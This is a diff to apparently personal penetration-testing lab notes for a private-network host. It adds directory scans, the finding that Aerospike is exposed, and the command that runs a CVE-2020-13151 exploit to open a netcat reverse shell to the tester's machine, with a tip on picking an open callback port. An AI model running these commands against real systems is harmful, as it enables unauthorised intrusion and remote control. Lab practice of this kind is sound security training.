@@ -77,8 +77,8 @@ nmap -sT -A -Pn -p 21,22 192.168.193.143
 gobuster dir -u http://192.168.193.143 -w /usr/share/wordlists/dirb/big.txt
 gobuster dir -u http://192.168.193.143:81 -w /usr/share/wordlists/dirb/big.txt
 # try feroxbuster
-feroxbuster http://192.168.193.143
-
+feroxbuster --url http://192.168.193.143
+feroxbuster --url http://192.168.193.143/api
 
 gobuster dir -u http://192.168.193.143:81 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x jpg,jpeg,pdf,lnk,conf
 
@@ -93,6 +93,13 @@ psql -h 192.168.193.143 -p 5432 -d postgres -U support
 
 # findings:
 - has pico CMS
+- from /api/heartbeat we find that aerospike is running
+- https://www.exploit-db.com/exploits/49067
+
+searchsploit -m 49067
+https://github.com/b4ny4n/CVE-2020-13151
+python3 cve2020-13151.py --ahost 192.168.193.143 --lhost 192.168.45.219 --lport 80 --netcatshell
+# note, many ports may be blocked so use one that's open such as 80 if shell not working
 ```
 
 .144
